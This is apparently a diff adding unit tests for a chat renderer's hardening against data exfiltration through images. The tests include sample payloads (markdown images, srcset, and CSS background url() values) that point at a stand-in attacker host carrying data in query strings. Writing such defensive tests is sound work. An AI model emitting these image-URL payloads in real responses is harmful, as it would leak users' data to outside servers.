@@ -1,6 +1,6 @@
 // @vitest-environment jsdom
 import { describe, expect, it } from 'vitest';
-import { _markdownToHtml, _postProcessMathFallbacksForTest, renderContentPart } from '../../src/built-in/chat/rendering/chatContentParts';
+import { _markdownToHtml, _postProcessMathFallbacksForTest, _stripExfilImageVectorsForTest, renderContentPart } from '../../src/built-in/chat/rendering/chatContentParts';
 
 describe('_markdownToHtml — block-level parser', () => {
 
@@ -378,5 +378,91 @@ describe('_markdownToHtml — block-level parser', () => {
     expect(html).toContain('<th>12 months</th>');
     expect(html).toContain('<td>2011</td>');
     expect(html).toContain('<td>3,000</td>');
+  });
+});
+
+// --- M65 Iter 2 � Layer 6 renderer image-exfil hardening --------------------
+
+describe('renderContentPart (Markdown) � usedWebTools image suppression', () => {
+  function makePart(content: string, usedWebTools?: boolean) {
+    return {
+      kind: 'markdown' as any,
+      content,
+      ...(usedWebTools !== undefined ? { usedWebTools } : {}),
+    };
+  }
+
+  it('renders <img> normally when usedWebTools is undefined', () => {
+    const el = renderContentPart(makePart('![cat](https://example.com/cat.png)'));
+    expect(el.querySelector('img')).toBeTruthy();
+  });
+
+  it('renders <img> normally when usedWebTools is false', () => {
+    const el = renderContentPart(makePart('![cat](https://example.com/cat.png)', false));
+    expect(el.querySelector('img')).toBeTruthy();
+  });
+
+  it('strips <img> and replaces with alt text when usedWebTools is true', () => {
+    const el = renderContentPart(makePart('![cat](https://attacker.test/?d=secret)', true));
+    expect(el.querySelector('img')).toBeNull();
+    expect(el.textContent).toContain('[image: cat]');
+  });
+
+  it('uses [image] placeholder when no alt is provided', () => {
+    const el = renderContentPart(makePart('![](https://attacker.test/?d=secret)', true));
+    expect(el.querySelector('img')).toBeNull();
+    expect(el.textContent).toContain('[image]');
+  });
+
+  it('strips raw HTML <img> when usedWebTools is true', () => {
+    // markdown-it has html:false, so raw <img> never reaches the DOM via
+    // the markdown path. Exercise the strip helper directly to prove the
+    // defense-in-depth path works for non-markdown sources.
+    const el = document.createElement('div');
+    el.innerHTML = '<img src="https://attacker.test/?d=x" alt="leak">';
+    _stripExfilImageVectorsForTest(el);
+    expect(el.querySelector('img')).toBeNull();
+    expect(el.textContent).toContain('[image: leak]');
+  });
+
+  it('strips <picture> and <source> when usedWebTools is true', () => {
+    const el = document.createElement('div');
+    el.innerHTML = '<picture><source srcset="https://attacker.test/?d=a" /><img src="x" alt="x" /></picture>';
+    _stripExfilImageVectorsForTest(el);
+    expect(el.querySelector('picture')).toBeNull();
+    expect(el.querySelector('source')).toBeNull();
+    expect(el.querySelector('img')).toBeNull();
+  });
+
+  it('strips srcset attribute from any tag when usedWebTools is true', () => {
+    const el = document.createElement('div');
+    el.innerHTML = '<span srcset="https://attacker.test/?d=x">hello</span>';
+    _stripExfilImageVectorsForTest(el);
+    expect(el.querySelector('span[srcset]')).toBeNull();
+    expect(el.querySelector('span')).toBeTruthy(); // span itself preserved
+  });
+
+  it('strips inline style background-image: url() when usedWebTools is true', () => {
+    const el = document.createElement('div');
+    el.innerHTML = '<span style="background-image: url(https://attacker.test/?d=x)">hi</span>';
+    _stripExfilImageVectorsForTest(el);
+    const span = el.querySelector('span');
+    expect(span?.getAttribute('style')).toBeFalsy();
+  });
+
+  it('strips inline style background: url() shorthand when usedWebTools is true', () => {
+    const el = document.createElement('div');
+    el.innerHTML = '<span style="background: url(https://attacker.test/?d=x) repeat">hi</span>';
+    _stripExfilImageVectorsForTest(el);
+    const span = el.querySelector('span');
+    expect(span?.getAttribute('style')).toBeFalsy();
+  });
+
+  it('preserves non-image inline styles', () => {
+    const el = document.createElement('div');
+    el.innerHTML = '<span style="color: red">hi</span>';
+    _stripExfilImageVectorsForTest(el);
+    const span = el.querySelector('span');
+    expect(span?.getAttribute('style')).toBe('color: red');
   });
 });
